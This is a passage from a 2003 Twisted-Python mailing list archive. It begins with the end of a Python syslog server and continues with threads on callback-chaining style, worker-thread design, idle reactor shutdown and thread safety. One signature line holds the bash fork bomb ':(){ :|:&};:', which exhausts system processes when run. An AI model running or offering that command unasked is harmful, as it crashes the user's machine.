        self.factory.numberConnections -= 1

    def dataReceived(self, data):
        ip = self.transport.getPeer()[1]
        if data[2] == ">":
            other = " ".join([ip, bit2string(int(data[1]))])
            self.factory.write(" ".join([other, data[3:], "\n"]))
        elif data[3] == ">":
            other = " ".join([ip, bit2string(int(data[1:2]))])
            self.factory.write(" ".join([other, data[4:], "\n"]))
        else:
            other = " ".join([ip, "unknown.unknown"])
            self.factory.write(" ".join([other, data, "\n"]))

class syslogFactory(protocol.Factory):
    noisy = 0
    numberConnections = 0
    maxNumberConnections = 256
    write = sys.stdout.write
    
    

if __name__ == "__main__":
    import sys, os
    from twisted.python import log
    log.logfile=sys.stderr
    try:
        config = syslogOptions()
        config.parseOptions()
    except usage.UsageError, ue:
        print >>sys.stderr, '%s:'%sys.argv[0], ue
        sys.exit(1)
    syslogTCP = syslogFactory()
    syslogTCP.protocol = outputTCP
    syslogSSL = syslogFactory()
    syslogSSL.protocol = outputTCP
    ctx = ssl.DefaultOpenSSLContextFactory(config.opts['cert'], config.opts['cert'])
    reactor.listenUDP(514, outputUPD(), interface=config.opts['ip'])
    reactor.listenTCP(514, syslogTCP,   interface=config.opts['ip'])
    reactor.listenSSL(728, syslogSSL , ctx, interface=config.opts['ip'])
    reactor.run()

From tv at twistedmatrix.com  Thu Jul 10 15:17:59 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 22:17:59 +0300
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710153326.18861.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com> <20030710153326.18861.qmail@green.zadka.com>
Message-ID: <20030710191759.GA18878@lapdog>

On Thu, Jul 10, 2003 at 03:33:26PM -0000, Moshe Zadka wrote:
> > > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > > ).addCallback(util.println
> > > ).addCallback(lambda _: reactor.stop())
> > 
> > 	*vomit*
> > 
> > d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
> > d.addCallback(util.println)
> > d.addCallback(lambda _: reactor.stop())
> > 
> > 	anyone?
> 
> No.
> The above is the common,

	Unfortunately.

> and correct, coding style.

	Yes, it's legal. It's still ugly.

> It is the very reason .addCallback returns self. 

	Yes, and that's part of the problem; not the reason
	why ugly code should be tolerated.


	I mean, eww yuk. Look at it. ")" at the start of every
	(non-first) line? A special case for the last line?

	 |         |
	 v         v     |
	return foo(      v
	).addCallback(bar
	).addCallback(baz
	).addCallback(quux
	).addCallback(thud
	).addCallback(xyzzy)
	^                  ^
	|                  |


	The prettier alternative isn't even noticably longer,
	and is easier to type even. And the last line isn't
	a special case. And it doesn't separate a return away
	from the end of the functions.


	That snippet looks like the reason I left perl. Stop
	giving me the creeps, and give me code that looks
	simple, regular and easy to scan.

-- 
:(){ :|:&};:



From mesozoic at polynode.com  Thu Jul 10 15:28:44 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Thu, 10 Jul 2003 15:28:44 -0400
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <002b01c34704$9ef42eb0$0401a8c0@razor>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com> <002b01c34704$9ef42eb0$0401a8c0@razor>
Message-ID: <20030710192844.GI13205@polynode.com>

Twisted suddenly isn't so painful, is it?  :)

I'm working on a similar (though more convoluted) project to collect logs
and general event information from a wide array of sources.  I started with
syslog because it was easy to implement.  Next up are Windows Event Logs,
MySQL databases, and FBI employee records. (Whoops; forget I said that last
part.)

I've written something that's probably close to what you have -- a server
that listens for syslog messages, then does stuff with them.  (Only I've
implemented it for TCP, which requires syslog-ng; I'd like to see whether
UDP is much different.)

As soon as my code is to a semi-workable state, I plan on releasing it (and
posting to the list, of course) -- this should be another week or so.
In the meantime, could we see what you've come up with?

Working examples and discussion of coding practices are a Good Thing,
especially when you can get the senior Twisted guys involved ;)

-- 
Alex Levy
WWW: http://mesozoic.geecs.org

"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From 2002 at weholt.org  Thu Jul 10 16:33:00 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 22:33:00 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com> <002b01c34704$9ef42eb0$0401a8c0@razor> <20030710192844.GI13205@polynode.com>
Message-ID: <006501c34722$750e56c0$0401a8c0@razor>

Eh ... I'm not sure. My contract with my employeer states very clear that
anything produced with hardware or software which belong to them or any
results of work done during my workhours belong to them so I really don't
know.

Anyway, it was rather easy and the code isn't cleaned up for
mass-consumption so to speak. It was something that had to be done quickly.

I'll see what I can do.

Thomas

----- Original Message -----
From: "Alex Levy" <mesozoic at polynode.com>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 9:28 PM
Subject: Re: [Twisted-Python] Implementing a syslog-deamon ??


> Twisted suddenly isn't so painful, is it?  :)
>
> I'm working on a similar (though more convoluted) project to collect logs
> and general event information from a wide array of sources.  I started
with
> syslog because it was easy to implement.  Next up are Windows Event Logs,
> MySQL databases, and FBI employee records. (Whoops; forget I said that
last
> part.)
>
> I've written something that's probably close to what you have -- a server
> that listens for syslog messages, then does stuff with them.  (Only I've
> implemented it for TCP, which requires syslog-ng; I'd like to see whether
> UDP is much different.)
>
> As soon as my code is to a semi-workable state, I plan on releasing it
(and
> posting to the list, of course) -- this should be another week or so.
> In the meantime, could we see what you've come up with?
>
> Working examples and discussion of coding practices are a Good Thing,
> especially when you can get the senior Twisted guys involved ;)
>
> --
> Alex Levy
> WWW: http://mesozoic.geecs.org
>
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From glyph at twistedmatrix.com  Thu Jul 10 17:08:02 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Thu, 10 Jul 2003 16:08:02 -0500
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710191759.GA18878@lapdog>
Message-ID: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>

On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:

>> It is the very reason .addCallback returns self.
>
> 	Yes, and that's part of the problem; not the reason
> 	why ugly code should be tolerated.

This is a highly subjective discussion, of course.  IMHO, the 
multiple-lines-of-chained-addCallback style is easier to both to read 
and write because, provided you use a sensible editor, the indentation 
will end up something like this instead:

   return foo (
     ).addCallback(bar
     ).addCallback(baz
     ) # ...

If the proper placement of parentheses is a particular problem for you, 
consider

   return (foo()
           .addCallback(bar)
           .addCallback(baz)
           .addCallback(boz))

which is a style that I often prefer.

If you think _that_ is too ugly, then I wonder how you would wrap 
parameters across multiple lines - however, this ugliness will only 
_really_ be solved by adding some kind of block syntax to python.  
Personally I have better things to do at the moment.

As in any coding style discussion, consistency wins over correctness, 
so for Twisted, this is the "right way" to chain callbacks as far as 
I'm concerned :).




From pinard at iro.umontreal.ca  Thu Jul 10 18:00:40 2003
From: pinard at iro.umontreal.ca (=?iso-8859-1?q?Fran=E7ois_Pinard?=)
Date: 10 Jul 2003 18:00:40 -0400
Subject: [Twisted-Python] Re: My pet peeve ugly coding style
In-Reply-To: <20030710191759.GA18878@lapdog>
References: <006f01c34676$9a28db80$0401a8c0@razor>
	<20030710090455.6350.qmail@green.zadka.com>
	<20030710124125.11536.qmail@green.zadka.com>
	<20030710153326.18861.qmail@green.zadka.com>
	<20030710191759.GA18878@lapdog>
Message-ID: <oqfzlehwjb.fsf@titan.progiciels-bpi.ca>

[Tommi Virtanen]

> On Thu, Jul 10, 2003 at 03:33:26PM -0000, Moshe Zadka wrote:
> > > > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > > > ).addCallback(util.println
> > > > ).addCallback(lambda _: reactor.stop())

> 	Yes, it's legal. It's still ugly.

> 	return foo(      v
> 	).addCallback(bar
> 	).addCallback(baz
> 	).addCallback(quux
> 	).addCallback(thud
> 	).addCallback(xyzzy)

For the above, I would most probably use:

 	return (foo()
                .addCallback(bar)
 	        .addCallback(baz)
 	        .addCallback(quux)
 	        .addCallback(thud)
 	        .addCallback(xyzzy))

The Python mode (for Emacs) agrees with this indentation, given the
surrounding pair of parentheses exists, and this is why I type them.  This
mode (through those having written it: so far that I know, Tim Peters and
Barry Warsaw) is usually a good advisor about correct indentation.

About using dot at the beginning of the line instead of the end, it looks
strange when you are not used to it, but if follows the general principle of
GNU programming standards for C, which is worth for Python as well, that a
continued expression is more legible when the operator is at the start of
the continuation line instead of at the end of the continued one.  I follow
this convention quite systematically, and indeed, the code is more legible.

-- 
Fran?ois Pinard   http://www.iro.umontreal.ca/~pinard



From golux at comcast.net  Thu Jul 10 20:27:10 2003
From: golux at comcast.net (Steve Waterbury)
Date: Thu, 10 Jul 2003 20:27:10 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>
References: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>
Message-ID: <3F0E045E.1010504@comcast.net>

Glyph Lefkowitz wrote:
> On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:
>>
>>     Yes, and that's part of the problem; not the reason
>>     why ugly code should be tolerated.
> 
> This is a highly subjective discussion, of course.  ...

... true ... and my gut votes with Tommi.

>   return foo (
>     ).addCallback(bar
>     ).addCallback(baz
>     ) # ...

IMHO, that's still ugly.

> If the proper placement of parentheses is a particular problem for you, 
> consider
> 
>   return (foo()
>           .addCallback(bar)
>           .addCallback(baz)
>           .addCallback(boz))
> 
> which is a style that I often prefer.

Somewhat better, but I still like Tommi's example.

> If you think _that_ is too ugly, then I wonder how you would wrap 
> parameters across multiple lines  ...

To me, that's a separate issue.

> As in any coding style discussion, consistency wins over correctness, so 
> for Twisted, this is the "right way" to chain callbacks as far as I'm 
> concerned :) ...

Whatever.  "De gustibus non est disputandum."

Steve.




From glyph at twistedmatrix.com  Thu Jul 10 21:58:21 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Thu, 10 Jul 2003 20:58:21 -0500
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
In-Reply-To: <1057769430.2859.64.camel@biproc>
Message-ID: <2666D284-B343-11D7-B07D-000393C9700E@twistedmatrix.com>

On Wednesday, July 9, 2003, at 11:50 AM, Philippe Lafoucri?re wrote:

> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.

Philippe, I applaud this effort, but I think that you're working on 
something different than what you think you're working on ;-).

twistedmatrix.com is the central distribution site for the software and 
documentation.  That's not to say the site doesn't need help - far from 
it, it definitely needs a new maintainer! - but something authored with 
CMF or Plone is more of a "community" website; this is like the 
distinction between http://starship.python.net/ and 
http://www.python.org/.

I think it might be good to have a separate "User Community" and 
"Developer Community".  If you launch such a site, I will gladly link 
to it from the front page of twistedmatrix.com.

These mailing lists are appropriate for much of the discussion that has 
happened on them so far, but I do occasionally feel as if the core 
Twisted development team is stifling experimentation outside the bounds 
of our original intentions for the software.

There has been much talk of the "right way" to do things of late.  
While I have strong feelings about what the "right way" is, and a lot 
more design vision than implemented code, having the user community 
veer off on some tangents to see what's possible and what "fits" 
outside the auspices of the central development community might let us 
exchange more fully-formed and coherent ideas.  Right now I feel like 
the discourse is too much like

	Application Author: "Maybe-"
	Developer: "No."
	Author: "But-"
	Developer: "Sorry."
	Author: "Oh."
	Developer: "See?"
	Author: "What's woven.guard?"
	Developer: "ARRRGH" *bang*

If the application authors themselves had a community to discuss ideas 
and present them fully-formed, we might see something more like:

	Author[s]: "Can we include advanced Frobnitz support in Twisted 1.5?"
	Developer: "It's too complicated."
	Author: "But I have a working implementation and it's only 500 lines 
of Python."
	Developer: "Oh, maybe that's not so bad.  Would you contribute it?"
	Author: "Sure.  But, what about woven.guard support?"
	Developer: "ARRRRGH" *bang*

And eventually, we can omit the last exchange as some of us have more 
free time to actually document various APIs more clearly.



From exarkun at twistedmatrix.com  Fri Jul 11 01:27:49 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 01:27:49 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <3F0E045E.1010504@comcast.net>
References: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com> <3F0E045E.1010504@comcast.net>
Message-ID: <20030711052739.GA16474@intarweb.us>

On Thu, Jul 10, 2003 at 08:27:10PM -0400, Steve Waterbury wrote:
> Glyph Lefkowitz wrote:
> >On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:
> [snip]
> 
> >  return foo (
> >    ).addCallback(bar
> >    ).addCallback(baz
> >    ) # ...
> 
> IMHO, that's still ugly.
> 
> >If the proper placement of parentheses is a particular problem for you, 
> >consider
> >
> >  return (foo()
> >          .addCallback(bar)
> >          .addCallback(baz)
> >          .addCallback(boz))
> >
> [snip]

    reduce(Deferred.addCallback, (bar, baz, boz), foo())

> Whatever.  "De gustibus non est disputandum."
> 
> Steve.
> 

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030711/3503a07b/attachment.pgp 

From glyph at twistedmatrix.com  Fri Jul 11 02:12:07 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 11 Jul 2003 01:12:07 -0500
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030711052739.GA16474@intarweb.us>
Message-ID: <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>

On Friday, July 11, 2003, at 12:27 AM, Jp Calderone wrote:

>     reduce(Deferred.addCallback, (bar, baz, boz), foo())

In the future, people will call this kind of mental illness "Calderone 
syndrome" and it will be well understood.  In the meanwhile, it is 
important that those of you listening in at home do NOT pay attention 
to JP when he chimes in with little nuggets like this; without the 
context of a URL with "evil" in it, I fear that someone may take him 
seriously.




From ta-meyer at ihug.co.nz  Fri Jul 11 02:14:07 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Fri, 11 Jul 2003 18:14:07 +1200
Subject: [Twisted-Python] IMAP BODYSTRUCTURE format & the email.Messages
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13025656A5@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz>

[Apologies for the cross-post].

Does anyone know of existing code to convert/format/flatten an email.Message
into the correct format for IMAP's BODYSTRUCTURE request?  (it basically
breaks down all the MIME parts of the message).  It can use twisted or
imaplib, or neither, I don't care.

Thanks,
Tony Meyer




From minh.luu at toll.com.au  Fri Jul 11 02:55:23 2003
From: minh.luu at toll.com.au (Minh Luu)
Date: Fri, 11 Jul 2003 16:55:23 +1000
Subject: [Twisted-Python] Simultaneously client-server app
Message-ID: <005401c34779$667b5700$0202d90a@its09455>

Twisted Masters,

Has anyone any suggestion on how I might start on the following task using Twisted?

What I would like to do is a type of server that will serve a number of clients and itself is a client of other servers. It requires a spool of worker threads to perform time-consuming tasks and database related tasks.  All the network I/O will be handled by a single async thread using select. A simple diagram below demo the model I would like to implement.

Thank you.

                 |  |  |  |       ^  ^  ^  ^
                 |  |  |  |       |  |  |  |
                 V  V  V  V       |  |  |  |
            +-------------------------------------------------+
            |    Network I/O Thread                           |
            |    (async-connection using select)              |
            +-------------------------------------------------+
                             |                            ^
                             |                            |  
                             V                            |
            +----------------------------------------+    |
            |   Queue Thread                         |    |
            |   (to dispatch to the worker threads)  |    |
            +----------------------------------------+    |
               |                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
               |   +---------------------------------+    |
               |                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
               |   +---------------------------------+    |
               |                                          |
               .                                          |
               .                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
                   +---------------------------------+
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030711/16db3b97/attachment.htm 

From andrew-twisted at puzzling.org  Fri Jul 11 03:52:38 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 11 Jul 2003 17:52:38 +1000
Subject: [Twisted-Python] Simultaneously client-server app
In-Reply-To: <005401c34779$667b5700$0202d90a@its09455>
References: <005401c34779$667b5700$0202d90a@its09455>
Message-ID: <20030711075238.GB23649@frobozz>

On Fri, Jul 11, 2003 at 04:55:23PM +1000, Minh Luu wrote:
>    Twisted Masters,
>     
>    Has anyone any suggestion on how I might start on the following task using
>    Twisted?
>     
>    What I would like to do is a type of server that will serve a number of
>    clients and itself is a client of other servers. It requires a spool of
>    worker threads to perform time-consuming tasks and database related
>    tasks.  All the network I/O will be handled by a single async thread using
>    select. A simple diagram below demo the model I would like to implement.
[snip pretty diagram]

I doubt threads and select are actually requirements you have, rather, it's
just how you think it should work.  But if you know how it should work, why
ask us?  ;)

There are lots of blanks in your description, so it's hard to guess what you
need to know.  You effectively have asked a couple of very general
questions, so I'll give some general answers, and hope that's enough.  If it
isn't, try being more specific about what you're doing, and I'll try to give
more specific answers.


* Question: *
"What I would like to do is a type of server that will serve a number of
clients and itself is a client of other servers."

* Answer: *
Network clients and servers in Twisted are pretty easy, and its very good
at them -- have you seen these HOWTOs?
    http://twistedmatrix.com/documents/howto/servers
    http://twistedmatrix.com/documents/howto/clients

Being a server and a client at once is as easy as:
    reactor.listenTCP(1234, MyServerFactory())
    reactor.connectTCP('host', 4321, MyClientFactory())


* Question: *
"...a spool of worker threads to perform time-consuming tasks..."

* Answer: *
Have you seen the "Using Threads" HOWTO?
    http://twistedmatrix.com/documents/howto/threading

The key tool you probably want to use when working with threads is
twisted.internet.threads.deferToThread.

Also, be aware that threads aren't necessarily the only solution to
"time-consuming tasks", although it would help to know what these tasks
actually are :)


* Question: *
"...and database related tasks"

* Answer: *
The twisted.enterprise package has support for using standard Python DB-API
2.0 compliant modules.  You probably just want to use
twisted.enterprise.adbapi, which is described here:
    http://twistedmatrix.com/documents/howto/enterprise

That document is a little out of date, unfortunately -- it doesn't mention
that you can avoid adbapi.Augmentation if you don't like that approach, and
just use adbapi.ConnectionPool directly, although the its API is fairly ugly
and not very Twisted-like.  That module could probably do with an overhaul,
but that's not your problem ;)


I hope I've helped at least a little.

Regards,

-Andrew.




From exarkun at twistedmatrix.com  Fri Jul 11 06:22:29 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 06:22:29 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>
References: <20030711052739.GA16474@intarweb.us> <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>
Message-ID: <20030711062112.GA17293@intarweb.us>

On Fri, Jul 11, 2003 at 01:12:07AM -0500, Glyph Lefkowitz wrote:
> 
> On Friday, July 11, 2003, at 12:27 AM, Jp Calderone wrote:
> 
> >    reduce(Deferred.addCallback, (bar, baz, boz), foo())
> 
> In the future, people will call this kind of mental illness "Calderone 
> syndrome" and it will be well understood.  In the meanwhile, it is 
> important that those of you listening in at home do NOT pay attention 
> to JP when he chimes in with little nuggets like this; without the 
> context of a URL with "evil" in it, I fear that someone may take him 
> seriously.
> 

  Woo hoo, my own syndrome.

-- 
#!/bin/bash
( LIST=(~/.sigs/*.sig)
  cat ${LIST[$(($RANDOM % ${#LIST[*]}))]}
  echo -- $'\n' `uptime | sed -e 's/.*m//'` ) > ~/.signature
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030711/d71ddb8a/attachment.pgp 

From 2002 at weholt.org  Fri Jul 11 08:04:36 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 11 Jul 2003 14:04:36 +0200
Subject: [Twisted-Python] Simultaneously client-server app
References: <005401c34779$667b5700$0202d90a@its09455> <20030711075238.GB23649@frobozz>
Message-ID: <001d01c347a4$997360f0$3ba8a8c0@gatsoft.no>

I have some questions which seem to be related to this.

I have a webserver which serves as a newsaggregator etc. Once a while a
"worker" ( being a thread or not ) must go out and collect, parse and store
new items served by rss/rdf-feeds from around the net. Using a
SQLite-database which takes one connect at the time, at least as I
understand it, using threads could pose a serious problem if do-able at all.
I have another "worker" collecting information about files in given folders,
generating sha1-checksums etc. which is *very*  time consuming on large
amounts of data. This info must also go into the database.

So far I got the code that schedules a call and re-schedules it after the
call has finished. But the method that's called is blocking and has to be
re-written using deferreds or threads or something.

<dream-mode value="on" requirements="stupidity filter">
The utlimate goal would be to have some way of letting the user easily and
quickly define new workers doing user-defined things without hoggin the
server and by using as little as possible of strange, weird, technical,
complicated Twisted-things like deferreds, callbacks, threads etc.

My question is; is there a generic way to make old-style blocking Python
code twisted-friendly non-blocking using deferToThread or deferreds wrapped
around it?
</dream-mode>

I'm going to look into tnntprss.py which was mentioned yesterday or
something on the lists, which does some of the things I need, but any
example on how to go about this would be nice.

PS! Another question; should these workers be located in an
ApplicationService-subclass?

Thomas



----- Original Message -----
From: "Andrew Bennetts" <andrew-twisted at puzzling.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 11, 2003 9:52 AM
Subject: Re: [Twisted-Python] Simultaneously client-server app


> On Fri, Jul 11, 2003 at 04:55:23PM +1000, Minh Luu wrote:
> >    Twisted Masters,
> >
> >    Has anyone any suggestion on how I might start on the following task
using
> >    Twisted?
> >
> >    What I would like to do is a type of server that will serve a number
of
> >    clients and itself is a client of other servers. It requires a spool
of
> >    worker threads to perform time-consuming tasks and database related
> >    tasks.  All the network I/O will be handled by a single async thread
using
> >    select. A simple diagram below demo the model I would like to
implement.
> [snip pretty diagram]
>
> I doubt threads and select are actually requirements you have, rather,
it's
> just how you think it should work.  But if you know how it should work,
why
> ask us?  ;)
>
> There are lots of blanks in your description, so it's hard to guess what
you
> need to know.  You effectively have asked a couple of very general
> questions, so I'll give some general answers, and hope that's enough.  If
it
> isn't, try being more specific about what you're doing, and I'll try to
give
> more specific answers.
>
>
> * Question: *
> "What I would like to do is a type of server that will serve a number of
> clients and itself is a client of other servers."
>
> * Answer: *
> Network clients and servers in Twisted are pretty easy, and its very good
> at them -- have you seen these HOWTOs?
>     http://twistedmatrix.com/documents/howto/servers
>     http://twistedmatrix.com/documents/howto/clients
>
> Being a server and a client at once is as easy as:
>     reactor.listenTCP(1234, MyServerFactory())
>     reactor.connectTCP('host', 4321, MyClientFactory())
>
>
> * Question: *
> "...a spool of worker threads to perform time-consuming tasks..."
>
> * Answer: *
> Have you seen the "Using Threads" HOWTO?
>     http://twistedmatrix.com/documents/howto/threading
>
> The key tool you probably want to use when working with threads is
> twisted.internet.threads.deferToThread.
>
> Also, be aware that threads aren't necessarily the only solution to
> "time-consuming tasks", although it would help to know what these tasks
> actually are :)
>
>
> * Question: *
> "...and database related tasks"
>
> * Answer: *
> The twisted.enterprise package has support for using standard Python
DB-API
> 2.0 compliant modules.  You probably just want to use
> twisted.enterprise.adbapi, which is described here:
>     http://twistedmatrix.com/documents/howto/enterprise
>
> That document is a little out of date, unfortunately -- it doesn't mention
> that you can avoid adbapi.Augmentation if you don't like that approach,
and
> just use adbapi.ConnectionPool directly, although the its API is fairly
ugly
> and not very Twisted-like.  That module could probably do with an
overhaul,
> but that's not your problem ;)
>
>
> I hope I've helped at least a little.
>
> Regards,
>
> -Andrew.
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From pje at telecommunity.com  Fri Jul 11 12:18:42 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Fri, 11 Jul 2003 12:18:42 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
Message-ID: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>

Hi.  I've recently had an inquiry from a PEAK user who wants their reactor 
loop to shut down automatically when there are no selectables or pending 
calls.  There doesn't appear to be any way to do this without breaking 
reactor encapsulation, as there is no (for example) 'getSelectables()' method.

Is this something that could be added, or is there any general interest in 
having idle reactors shut down?  In principle, there is no way for a 
running-on-empty reactor to do any further useful work, and no way for it 
to be shut down, either.  (If one is using threads, then there is always a 
"waker" selectable present, which means that by definition a reactor using 
threads is never "running on empty".)

Thanks.




From dalke at dalkescientific.com  Fri Jul 11 12:42:05 2003
From: dalke at dalkescientific.com (Andrew Dalke)
Date: Fri, 11 Jul 2003 10:42:05 -0600
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>
Message-ID: <9B1926EE-B3BE-11D7-B4E7-000393C92466@dalkescientific.com>

Tony Meyer:
> This re really isn't that complex.

As someone who's had to do an inordinate amount of parsing in my
life, I agree with Tony.  The long regex he wrote is a good way
to do it.  It's concise, easy to understand (for anyone who has
done regexp work), less bug prone then breaking it out into
smaller regexps, etc.  And it's fast.

					Andrew
					dalke at dalkescientific.com




From itamar at itamarst.org  Fri Jul 11 13:57:03 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 11 Jul 2003 13:57:03 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
In-Reply-To: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
References: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
Message-ID: <20030711135703.73700ee0.itamar@itamarst.org>

On Fri, 11 Jul 2003 12:18:42 -0400
"Phillip J. Eby" <pje at telecommunity.com> wrote:

> Is this something that could be added, or is there any general
> interest in having idle reactors shut down?  In principle, there is no
> way for a running-on-empty reactor to do any further useful work, and
> no way for it to be shut down, either.  (If one is using threads, then
> there is always a "waker" selectable present, which means that by
> definition a reactor using threads is never "running on empty".)

There may be scheduled calls (and some of these are module level, e.g.
http and thus always present if that module is imported).

There may be a GUI connected to the event loop.

Users should probably track their, say, client connections if that's
what they're doing and shutdown the reactor manually.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From pje at telecommunity.com  Fri Jul 11 18:14:10 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Fri, 11 Jul 2003 18:14:10 -0400
Subject: [Twisted-Python] Shutdown empty reactor?
In-Reply-To: <20030711135703.73700ee0.itamar@itamarst.org>
References: <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
 <5.1.1.6.0.20030711121416.02fec220@mail.rapidsite.net>
Message-ID: <5.1.1.6.0.20030711181150.031089d0@telecommunity.com>

At 01:57 PM 7/11/03 -0400, Itamar Shtull-Trauring wrote:
>On Fri, 11 Jul 2003 12:18:42 -0400
>"Phillip J. Eby" <pje at telecommunity.com> wrote:
>
> > Is this something that could be added, or is there any general
> > interest in having idle reactors shut down?  In principle, there is no
> > way for a running-on-empty reactor to do any further useful work, and
> > no way for it to be shut down, either.  (If one is using threads, then
> > there is always a "waker" selectable present, which means that by
> > definition a reactor using threads is never "running on empty".)
>
>There may be scheduled calls (and some of these are module level, e.g.
>http and thus always present if that module is imported).

There's a getDelayedCalls() method available to see what scheduled calls 
exist.  I was looking for an official way to check for selectables.




From 2002 at weholt.org  Fri Jul 11 20:05:16 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 02:05:16 +0200
Subject: [Twisted-Python] One big smile ...
Message-ID: <004d01c34809$46f32030$0401a8c0@razor>

I implemented a small newsfetching webserver today. At first I used some
blocking code at startup and then reactor.callLater(some_intervall,
sameBlockingMethod) to call it later and refresh the content later. It
processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
could see the output. I was quite happy about the result. Just for fun I
tried to do the blocking code in a thread instead, - with mixed results.
Read some more docs. And did a deferToThread for each call to the blocking
method. Added a callback-method that parsed the results. A bit more hacking
and ...then .. suddenly ... it was just .... so fast. No hogging the server
at startup, all content fetched,, *much* faster than before. Everything
seemed great. I had finally got the grip on threads and deferred. But
something was wrong with my data. Some data were in the wrong lists etc. so
I guess I need some mutex-locking or something. This is were you guys come
in. Do I need to aquire a lock to avoid updating wrong parts of my
datastructure?



In the docs it says:

"This will make certain parts of Twisted thread-safe so you can use them
safely. However, note that most parts of Twisted are not thread-safe."



What parts are still not thread-safe? My datastructures? They don't seem
thread-safe.

If I just solve the drunken attribute update process going on in my server
this will be a real break-thru for me Twisted-wise.

Anyway, I still have a HUGE smile on my face.



Thomas






From andrew-twisted at puzzling.org  Fri Jul 11 20:23:41 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sat, 12 Jul 2003 10:23:41 +1000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712002341.GB24694@frobozz>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
[...]
> seemed great. I had finally got the grip on threads and deferred. But
> something was wrong with my data. Some data were in the wrong lists etc. so
> I guess I need some mutex-locking or something. This is were you guys come
> in. Do I need to aquire a lock to avoid updating wrong parts of my
> datastructure?
> 
